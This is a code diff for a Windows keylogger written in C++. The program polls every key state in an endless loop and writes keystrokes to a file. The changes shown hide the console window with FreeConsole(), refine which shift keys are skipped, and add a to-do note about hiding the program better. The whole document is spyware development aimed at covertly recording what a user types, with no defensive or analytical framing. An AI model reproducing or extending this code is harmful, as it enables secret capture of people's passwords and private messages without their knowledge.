@@ -26,7 +26,7 @@ void writeKeyStroke(int trueKey)
     {
         file << "\n";
     }
-    else
+    else 
     {
         file << static_cast<char>(trueKey);
     }
@@ -36,7 +36,7 @@ void writeKeyStroke(int trueKey)
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     PSTR lpCmdLine, int nCmdShow)
 {
-    //FreeConsole();
+    FreeConsole();
     Maps vkMaps;
     vkMaps.initializeMaps();
     while (1)
@@ -44,7 +44,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
         for (int i = 1; i < 254; i++)
         {
             int key = GetAsyncKeyState(i);
-            while (key == KEY_IS_PRESSED && i != 16)
+            int dontLogShiftKey = (i != 16 && i != 160 && i != 161);
+            while (key == KEY_IS_PRESSED && dontLogShiftKey)
             {
                 int specialKey = vkMaps.searchAsciiMaps(i);
                 if (isShiftPressed() == 1) 
@@ -69,3 +70,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
         }
     }
 }
+
+/*
+    To-Do list
+
+    ~ idrk what to do now, maybe find a way to better hide it?
+*/
